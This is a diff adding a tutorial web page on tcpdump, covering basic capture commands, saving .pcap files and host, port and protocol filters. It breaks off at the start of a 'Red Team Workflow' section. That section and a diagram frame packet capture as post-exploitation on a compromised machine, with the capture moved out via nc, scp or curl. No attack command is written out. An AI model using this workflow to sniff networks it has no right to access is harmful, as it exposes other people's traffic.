@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16 2L4 7v9c0 8 5 14 12 16 7-2 12-8 12-16V7L16 2z' fill='%230a1628' stroke='%234a6fa5' stroke-width='2'/%3E%3Ccircle cx='16' cy='13' r='3.5' fill='none' stroke='%237ba3d4' stroke-width='2'/%3E%3Crect x='14.5' y='15' width='3' height='5' rx='1' fill='%237ba3d4'/%3E%3C/svg%3E">
+    <title>tcpdump - Cybersecurity Fundamentals</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-primary: #0a1628;
+            --bg-secondary: #0d1c30;
+            --bg-terminal: #0c0c0c;
+            --accent-primary: #4a6fa5;
+            --accent-light: #7ba3d4;
+            --accent-glow: rgba(74, 111, 165, 0.4);
+            --text-primary: #e8f0f8;
+            --text-secondary: #c4d4e8;
+            --text-muted: #a8b8c8;
+            --text-dim: #3a4a5a;
+            --border-subtle: rgba(74, 111, 165, 0.2);
+            --border-medium: rgba(74, 111, 165, 0.3);
+            --surface-subtle: rgba(74, 111, 165, 0.08);
+            --surface-medium: rgba(74, 111, 165, 0.15);
+            --surface-active: rgba(74, 111, 165, 0.25);
+            --font-mono: 'DM Mono', monospace;
+            --font-sans: 'DM Sans', system-ui, sans-serif;
+            --terminal-green: #4ade80;
+            --terminal-yellow: #facc15;
+            --terminal-red: #f87171;
+            --terminal-blue: #60a5fa;
+            --terminal-purple: #c084fc;
+            --terminal-cyan: #22d3ee;
+        }
+
+        body { font-family: var(--font-sans); background: var(--bg-primary); color: var(--text-secondary); min-height: 100vh; line-height: 1.6; }
+
+        /* Navigation */
+        .site-nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(10, 22, 40, 0.9); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border-subtle); }
+        .nav-container { max-width: 1200px; margin: 0 auto; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; height: 60px; }
+        .nav-logo { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text-primary); }
+        .nav-logo-icon { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; }
+        .nav-logo-text { font-weight: 500; font-size: 0.95rem; letter-spacing: 0.5px; }
+        .nav-links { display: flex; align-items: center; gap: 6px; }
+        .nav-dropdown { position: relative; }
+        .nav-dropdown-btn { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted); background: none; border: 1px solid transparent; padding: 8px 14px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: all 0.2s; letter-spacing: 0.5px; }
+        .nav-dropdown-btn:hover, .nav-dropdown.open .nav-dropdown-btn { color: var(--text-primary); background: var(--surface-subtle); border-color: var(--border-subtle); }
+        .nav-dropdown-btn svg { width: 10px; height: 10px; transition: transform 0.2s; }
+        .nav-dropdown.open .nav-dropdown-btn svg { transform: rotate(180deg); }
+        .nav-dropdown-menu { position: absolute; top: calc(100% + 8px); left: 0; background: rgba(13, 28, 48, 0.98); border: 1px solid var(--border-subtle); border-radius: 10px; padding: 8px; min-width: 240px; opacity: 0; visibility: hidden; transform: translateY(-8px); transition: all 0.2s; box-shadow: 0 16px 48px rgba(0, 0, 0, 0.5); backdrop-filter: blur(12px); }
+        .nav-dropdown.open .nav-dropdown-menu { opacity: 1; visibility: visible; transform: translateY(0); }
+        .nav-dropdown-item { display: block; padding: 10px 14px; color: var(--text-secondary); text-decoration: none; border-radius: 6px; transition: all 0.15s; }
+        .nav-dropdown-item:hover { background: var(--surface-medium); color: var(--text-primary); }
+        .nav-dropdown-item.current .nav-dropdown-item-title { color: var(--accent-light); }
+        .nav-dropdown-item-title { font-size: 0.85rem; font-weight: 500; margin-bottom: 2px; }
+        .nav-dropdown-item-desc { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-muted); }
+        .nav-mobile-toggle { display: none; background: none; border: 1px solid var(--border-subtle); color: var(--text-muted); padding: 6px 10px; border-radius: 4px; cursor: pointer; font-family: var(--font-mono); font-size: 0.8rem; }
+        .nav-mobile-toggle:hover { color: var(--text-primary); background: var(--surface-subtle); }
+        @media (max-width: 640px) {
+            .nav-links { display: none; position: absolute; top: 60px; left: 0; right: 0; background: rgba(10, 22, 40, 0.98); border-bottom: 1px solid var(--border-subtle); padding: 12px; flex-direction: column; gap: 4px; backdrop-filter: blur(12px); }
+            .nav-links.mobile-open { display: flex; }
+            .nav-mobile-toggle { display: block; }
+            .nav-dropdown { width: 100%; }
+            .nav-dropdown-btn { width: 100%; }
+            .nav-dropdown-menu { position: static; opacity: 1; visibility: visible; transform: none; box-shadow: none; border: none; background: var(--surface-subtle); border-radius: 8px; display: none; margin-top: 4px; min-width: auto; }
+            .nav-dropdown.open .nav-dropdown-menu { display: block; }
+        }
+
+        /* Page Layout */
+        .page { padding-top: 60px; min-height: 100vh; }
+        .page-content { max-width: 1000px; margin: 0 auto; padding: 40px 24px 80px; }
+
+        /* Hero Section */
+        .hero-section { text-align: center; margin-bottom: 48px; padding-bottom: 40px; border-bottom: 1px solid var(--border-subtle); }
+        .hero-title { color: var(--text-primary); font-size: 2rem; font-weight: 500; letter-spacing: 1px; margin-bottom: 8px; font-family: var(--font-mono); }
+        .hero-subtitle { color: var(--accent-primary); font-family: var(--font-mono); font-size: 0.8rem; letter-spacing: 2px; margin-bottom: 24px; text-transform: uppercase; }
+        .hero-intro { color: var(--text-muted); font-size: 0.95rem; max-width: 700px; margin: 0 auto 32px; line-height: 1.7; }
+
+        /* Section Styling */
+        .content-section { margin-bottom: 48px; }
+        .section-title {
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .section-title::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border-subtle);
+        }
+        .section-intro {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+
+        /* Explanation Box */
+        .explanation-box {
+            background: var(--surface-subtle);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 28px;
+            border-left: 3px solid var(--accent-primary);
+        }
+        .explanation-box p {
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+            line-height: 1.7;
+        }
+
+        /* Reference Tables */
+        .reference-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+            background: var(--surface-subtle);
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-subtle);
+            margin-bottom: 20px;
+        }
+        .reference-table th {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent-primary);
+            text-align: left;
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--border-medium);
+            background: var(--surface-medium);
+        }
+        .reference-table td {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border-subtle);
+            color: var(--text-secondary);
+        }
+        .reference-table tr:last-child td { border-bottom: none; }
+        .reference-table tr:hover td { background: var(--surface-medium); }
+        .reference-table td:first-child {
+            font-family: var(--font-mono);
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+        .reference-table code {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: var(--terminal-green);
+            background: rgba(74, 222, 128, 0.1);
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        /* Note Box */
+        .note-box {
+            background: var(--surface-subtle);
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin: 16px 0;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            border-left: 3px solid var(--accent-primary);
+        }
+        .note-box code {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--terminal-green);
+            background: rgba(74, 222, 128, 0.1);
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        /* Comparison Table */
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+            background: var(--surface-subtle);
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-subtle);
+            margin-bottom: 28px;
+        }
+        .comparison-table th {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: left;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border-medium);
+            background: var(--surface-medium);
+        }
+        .comparison-table th:first-child { color: var(--terminal-cyan); }
+        .comparison-table th:last-child { color: var(--terminal-purple); }
+        .comparison-table td {
+            padding: 14px 20px;
+            border-bottom: 1px solid var(--border-subtle);
+            color: var(--text-secondary);
+            vertical-align: top;
+        }
+        .comparison-table tr:last-child td { border-bottom: none; }
+        .comparison-table tr:hover td { background: var(--surface-medium); }
+
+        /* Workflow Diagram */
+        .workflow-diagram {
+            background: var(--surface-subtle);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            padding: 32px;
+            margin: 28px 0;
+        }
+        .workflow-diagram svg { width: 100%; max-width: 700px; height: auto; display: block; margin: 0 auto; }
+
+        /* Sub Section Title */
+        .sub-section-title {
+            font-size: 0.95rem;
+            color: var(--text-primary);
+            margin: 28px 0 16px;
+            font-weight: 500;
+        }
+
+        /* Red Team Section */
+        .red-team-section {
+            background: rgba(248, 113, 113, 0.08);
+            border: 1px solid rgba(248, 113, 113, 0.25);
+            border-radius: 12px;
+            padding: 24px;
+            margin-top: 28px;
+        }
+        .red-team-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        .red-team-icon { font-size: 1.2rem; }
+        .red-team-title {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--terminal-red);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .red-team-section .reference-table {
+            background: rgba(248, 113, 113, 0.05);
+            border-color: rgba(248, 113, 113, 0.2);
+        }
+        .red-team-section .reference-table th {
+            background: rgba(248, 113, 113, 0.1);
+            color: var(--terminal-red);
+        }
+
+        /* Steps */
+        .step-list {
+            counter-reset: step-counter;
+            margin: 20px 0;
+        }
+        .step-item {
+            display: flex;
+            gap: 16px;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(248, 113, 113, 0.15);
+        }
+        .step-item:last-child { border-bottom: none; }
+        .step-number {
+            counter-increment: step-counter;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(248, 113, 113, 0.15);
+            border: 1px solid var(--terminal-red);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--terminal-red);
+            flex-shrink: 0;
+        }
+        .step-number::before { content: counter(step-counter); }
+        .step-text {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+        .step-text code {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: var(--terminal-green);
+            background: rgba(74, 222, 128, 0.1);
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        .step-text .comment {
+            color: var(--text-dim);
+            font-style: italic;
+        }
+
+        /* Quick Reference Card */
+        .quick-ref-card {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .quick-ref-header {
+            background: #1a1a2e;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+        .quick-ref-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        .quick-ref-dot.red { background: #ff5f57; }
+        .quick-ref-dot.yellow { background: #febc2e; }
+        .quick-ref-dot.green { background: #28c840; }
+        .quick-ref-title {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-left: 12px;
+        }
+        .quick-ref-card .reference-table {
+            background: transparent;
+            border: none;
+            border-radius: 0;
+            margin: 0;
+        }
+        .quick-ref-card .reference-table th {
+            background: rgba(74, 111, 165, 0.1);
+        }
+
+        /* Glossary */
+        .glossary-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 12px;
+        }
+        .glossary-item {
+            background: var(--surface-subtle);
+            border: 1px solid var(--border-subtle);
+            border-radius: 8px;
+            padding: 14px 16px;
+            transition: all 0.2s;
+        }
+        .glossary-item:hover {
+            border-color: var(--accent-primary);
+            background: var(--surface-medium);
+        }
+        .glossary-term {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: var(--accent-light);
+            margin-bottom: 6px;
+        }
+        .glossary-def {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        @media (max-width: 600px) {
+            .comparison-table { font-size: 0.8rem; }
+            .comparison-table th, .comparison-table td { padding: 12px; }
+            .glossary-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="site-nav">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <div class="nav-logo-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="100%" height="100%"><path d="M16 2L4 7v9c0 8 5 14 12 16 7-2 12-8 12-16V7L16 2z" fill="#0a1628" stroke="#4a6fa5" stroke-width="2"/><circle cx="16" cy="13" r="3.5" fill="none" stroke="#7ba3d4" stroke-width="2"/><rect x="14.5" y="15" width="3" height="5" rx="1" fill="#7ba3d4"/></svg></div>
+                <span class="nav-logo-text">Cybersecurity Fundamentals</span>
+            </a>
+            <button class="nav-mobile-toggle" onclick="document.querySelector('.nav-links').classList.toggle('mobile-open')">&#9776;</button>
+            <div class="nav-links">
+                <div class="nav-dropdown">
+                    <button class="nav-dropdown-btn" onclick="toggleDropdown(this)">Networking <svg viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+                    <div class="nav-dropdown-menu">
+                        <a href="network-fundamentals.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Network Fundamentals</div>
+                            <div class="nav-dropdown-item-desc">IPs, ports, servers & clients</div>
+                        </a>
+                        <a href="protocols.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Protocol Reference</div>
+                            <div class="nav-dropdown-item-desc">How services communicate</div>
+                        </a>
+                        <a href="ports.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Ports Reference</div>
+                            <div class="nav-dropdown-item-desc">Common ports & red team quick ref</div>
+                        </a>
+                        <a href="osi-model.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">OSI Model</div>
+                            <div class="nav-dropdown-item-desc">7-layer communication framework</div>
+                        </a>
+                        <a href="tcp-ip-model.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">TCP/IP Model</div>
+                            <div class="nav-dropdown-item-desc">4-layer practical internet model</div>
+                        </a>
+                        <a href="arp.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">ARP Protocol</div>
+                            <div class="nav-dropdown-item-desc">IP to MAC address resolution</div>
+                        </a>
+                        <a href="dns.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">DNS Lookup</div>
+                            <div class="nav-dropdown-item-desc">Domain name resolution</div>
+                        </a>
+                        <a href="tcp-handshake.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">TCP Handshake</div>
+                            <div class="nav-dropdown-item-desc">Three-way connection establishment</div>
+                        </a>
+                        <a href="vpn.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">VPN</div>
+                            <div class="nav-dropdown-item-desc">Encrypted tunnels & privacy</div>
+                        </a>
+                        <a href="ssh.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">SSH</div>
+                            <div class="nav-dropdown-item-desc">Secure remote access & key auth</div>
+                        </a>
+                    </div>
+                </div>
+                <div class="nav-dropdown">
+                    <button class="nav-dropdown-btn" onclick="toggleDropdown(this)">Web <svg viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+                    <div class="nav-dropdown-menu">
+                        <a href="http.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">HTTP Protocol</div>
+                            <div class="nav-dropdown-item-desc">Methods, status codes, headers</div>
+                        </a>
+                        <a href="cookies.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Cookies</div>
+                            <div class="nav-dropdown-item-desc">Maintaining state on the web</div>
+                        </a>
+                    </div>
+                </div>
+                <div class="nav-dropdown">
+                    <button class="nav-dropdown-btn" onclick="toggleDropdown(this)">Linux <svg viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+                    <div class="nav-dropdown-menu">
+                        <a href="linux.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Linux Command Line</div>
+                            <div class="nav-dropdown-item-desc">Command line essentials</div>
+                        </a>
+                        <a href="linux-admin.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Packages & Logs</div>
+                            <div class="nav-dropdown-item-desc">Software management & system logs</div>
+                        </a>
+                    </div>
+                </div>
+                <div class="nav-dropdown">
+                    <button class="nav-dropdown-btn" onclick="toggleDropdown(this)">Windows <svg viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+                    <div class="nav-dropdown-menu">
+                        <a href="windows-essentials.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Windows Essentials</div>
+                            <div class="nav-dropdown-item-desc">MSConfig, utilities & admin tools</div>
+                        </a>
+                        <a href="windows-cmd.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Windows Command Line (CMD)</div>
+                            <div class="nav-dropdown-item-desc">CMD commands & terminal reference</div>
+                        </a>
+                        <a href="windows-powershell.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Windows PowerShell</div>
+                            <div class="nav-dropdown-item-desc">PowerShell cmdlets & scripting</div>
+                        </a>
+                        <a href="windows-security.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Windows Security</div>
+                            <div class="nav-dropdown-item-desc">Defender, firewall & device protection</div>
+                        </a>
+                    </div>
+                </div>
+                <div class="nav-dropdown">
+                    <button class="nav-dropdown-btn" onclick="toggleDropdown(this)">Tools <svg viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+                    <div class="nav-dropdown-menu">
+                        <a href="wireshark.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Wireshark Basics</div>
+                            <div class="nav-dropdown-item-desc">Packet capture & analysis</div>
+                        </a>
+                        <a href="tcpdump.html" class="nav-dropdown-item current">
+                            <div class="nav-dropdown-item-title">tcpdump</div>
+                            <div class="nav-dropdown-item-desc">Command-line packet capture</div>
+                        </a>
+                    </div>
+                </div>
+                <div class="nav-dropdown">
+                    <button class="nav-dropdown-btn" onclick="toggleDropdown(this)">Practical <svg viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+                    <div class="nav-dropdown-menu">
+                        <a href="ctf-methodology.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">CTF Methodology</div>
+                            <div class="nav-dropdown-item-desc">Systematic approach to CTF challenges</div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="page">
+        <div class="page-content">
+            <!-- Hero Section -->
+            <header class="hero-section">
+                <h1 class="hero-title">tcpdump</h1>
+                <p class="hero-subtitle">Command-line packet capture</p>
+                <p class="hero-intro">Capture network traffic from the terminal &mdash; essential when you only have shell access and can't run Wireshark.</p>
+            </header>
+
+            <!-- Section 1: What is tcpdump? -->
+            <section class="content-section">
+                <h2 class="section-title">What is tcpdump?</h2>
+                
+                <div class="explanation-box">
+                    <p>tcpdump is a command-line packet analyzer. It captures network traffic and displays it as text output or saves it to a file for later analysis.</p>
+                </div>
+            </section>
+
+            <!-- Section 2: tcpdump vs Wireshark -->
+            <section class="content-section">
+                <h2 class="section-title">tcpdump vs Wireshark</h2>
+                
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Use tcpdump when</th>
+                            <th>Use Wireshark when</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>On a remote server via SSH</td>
+                            <td>On your local machine with GUI</td>
+                        </tr>
+                        <tr>
+                            <td>Quick capture, analyze later</td>
+                            <td>Detailed analysis with filters</td>
+                        </tr>
+                        <tr>
+                            <td>Scripting or automation</td>
+                            <td>Visual inspection of packets</td>
+                        </tr>
+                        <tr>
+                            <td>Low resource environment</td>
+                            <td>Full-featured investigation</td>
+                        </tr>
+                        <tr>
+                            <td>Post-exploitation on compromised box</td>
+                            <td>Examining saved .pcap files</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <!-- Workflow Diagram -->
+                <div class="workflow-diagram">
+                    <svg viewBox="0 0 700 140" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Compromised Machine -->
+                        <rect x="20" y="40" width="120" height="60" rx="8" fill="#0d1c30" stroke="#f87171" stroke-width="2"/>
+                        <text x="80" y="65" text-anchor="middle" fill="#f87171" font-family="DM Mono" font-size="9">COMPROMISED</text>
+                        <text x="80" y="82" text-anchor="middle" fill="#e8f0f8" font-family="DM Mono" font-size="10">Target Machine</text>
+                        
+                        <!-- Arrow 1 -->
+                        <line x1="140" y1="70" x2="180" y2="70" stroke="#4a6fa5" stroke-width="2"/>
+                        <polygon points="180,65 190,70 180,75" fill="#4a6fa5"/>
+                        
+                        <!-- tcpdump -->
+                        <rect x="190" y="40" width="120" height="60" rx="8" fill="#0d1c30" stroke="#22d3ee" stroke-width="2"/>
+                        <text x="250" y="62" text-anchor="middle" fill="#22d3ee" font-family="DM Mono" font-size="10">tcpdump</text>
+                        <text x="250" y="82" text-anchor="middle" fill="#4ade80" font-family="DM Mono" font-size="9">-w capture.pcap</text>
+                        
+                        <!-- Arrow 2 -->
+                        <line x1="310" y1="70" x2="350" y2="70" stroke="#4a6fa5" stroke-width="2"/>
+                        <polygon points="350,65 360,70 350,75" fill="#4a6fa5"/>
+                        
+                        <!-- Transfer -->
+                        <rect x="360" y="40" width="120" height="60" rx="8" fill="#0d1c30" stroke="#facc15" stroke-width="2"/>
+                        <text x="420" y="62" text-anchor="middle" fill="#facc15" font-family="DM Mono" font-size="10">Transfer</text>
+                        <text x="420" y="82" text-anchor="middle" fill="#a8b8c8" font-family="DM Mono" font-size="9">nc / scp / curl</text>
+                        
+                        <!-- Arrow 3 -->
+                        <line x1="480" y1="70" x2="520" y2="70" stroke="#4a6fa5" stroke-width="2"/>
+                        <polygon points="520,65 530,70 520,75" fill="#4a6fa5"/>
+                        
+                        <!-- Wireshark -->
+                        <rect x="530" y="40" width="140" height="60" rx="8" fill="#0d1c30" stroke="#c084fc" stroke-width="2"/>
+                        <text x="600" y="62" text-anchor="middle" fill="#c084fc" font-family="DM Mono" font-size="10">Wireshark</text>
+                        <text x="600" y="82" text-anchor="middle" fill="#a8b8c8" font-family="DM Mono" font-size="9">Your Machine</text>
+                        
+                        <!-- Label -->
+                        <text x="350" y="125" text-anchor="middle" fill="#a8b8c8" font-family="DM Mono" font-size="10">Capture on target &rarr; Transfer &rarr; Analyze locally</text>
+                    </svg>
+                </div>
+            </section>
+
+            <!-- Section 3: Basic Commands -->
+            <section class="content-section">
+                <h2 class="section-title">Basic Commands</h2>
+                <p class="section-intro">Most commands require <code>sudo</code> or root privileges.</p>
+
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>What it does</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>tcpdump</code></td>
+                            <td>Capture all traffic on default interface</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -i eth0</code></td>
+                            <td>Capture on specific interface</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -i any</code></td>
+                            <td>Capture on all interfaces</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -D</code></td>
+                            <td>List available interfaces</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -c 100</code></td>
+                            <td>Capture only 100 packets then stop</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -n</code></td>
+                            <td>Show IP addresses (don't resolve to hostnames)</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -nn</code></td>
+                            <td>Show IPs and ports as numbers (no DNS or service name resolution)</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -v</code></td>
+                            <td>Verbose output (more detail)</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -vv</code></td>
+                            <td>Even more verbose</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -q</code></td>
+                            <td>Quiet &mdash; less output, just basics</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Section 4: Saving and Reading Captures -->
+            <section class="content-section">
+                <h2 class="section-title">Saving and Reading Captures</h2>
+
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>What it does</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>tcpdump -w capture.pcap</code></td>
+                            <td>Save packets to file</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -r capture.pcap</code></td>
+                            <td>Read packets from file</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump -c 500 -w capture.pcap</code></td>
+                            <td>Capture 500 packets and save</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="note-box">
+                    Save to <code>.pcap</code> format so you can open it in Wireshark later.
+                </div>
+            </section>
+
+            <!-- Section 5: Filters -->
+            <section class="content-section">
+                <h2 class="section-title">Filters</h2>
+                <p class="section-intro">Filter traffic to capture only what you need.</p>
+
+                <h3 class="sub-section-title">By Host</h3>
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>Filter</th>
+                            <th>What it captures</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>tcpdump host 10.10.10.5</code></td>
+                            <td>Traffic to or from that IP</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump src 10.10.10.5</code></td>
+                            <td>Traffic from that IP</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump dst 10.10.10.5</code></td>
+                            <td>Traffic to that IP</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3 class="sub-section-title">By Port</h3>
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>Filter</th>
+                            <th>What it captures</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>tcpdump port 80</code></td>
+                            <td>Traffic on port 80</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump port 443</code></td>
+                            <td>Traffic on port 443</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump src port 80</code></td>
+                            <td>Traffic from port 80</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump dst port 22</code></td>
+                            <td>Traffic to port 22</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3 class="sub-section-title">By Protocol</h3>
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>Filter</th>
+                            <th>What it captures</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>tcpdump tcp</code></td>
+                            <td>Only TCP traffic</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump udp</code></td>
+                            <td>Only UDP traffic</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump icmp</code></td>
+                            <td>Only ICMP (ping) traffic</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3 class="sub-section-title">Combining Filters</h3>
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>Filter</th>
+                            <th>What it captures</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>tcpdump host 10.10.10.5 and port 80</code></td>
+                            <td>HTTP traffic to/from that host</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump src 10.10.10.5 and tcp</code></td>
+                            <td>TCP traffic from that host</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump port 80 or port 443</code></td>
+                            <td>HTTP or HTTPS traffic</td>
+                        </tr>
+                        <tr>
+                            <td><code>tcpdump not port 22</code></td>
+                            <td>Everything except SSH</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Section 6: Red Team Workflow -->
+            <section class="content-section">
+                <h2 class="section-title">Red Team Workflow</h2>
+
+                <div class="red-team-section">
+                    <div class="red-team-header">
+                        <span class="red-team-icon">🎯</span>
+                        <span class="red-team-title">Post-Exploitation Packet Capture</span>
+                    </div>
+
+                    <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 20px;">
+                        You've compromised a Linux machine and want to capture internal network traffic.
+                    </p>
+
+                    <div class="step-list">
+                        <div class="step-item">
+                            <div class="step-number"></div>
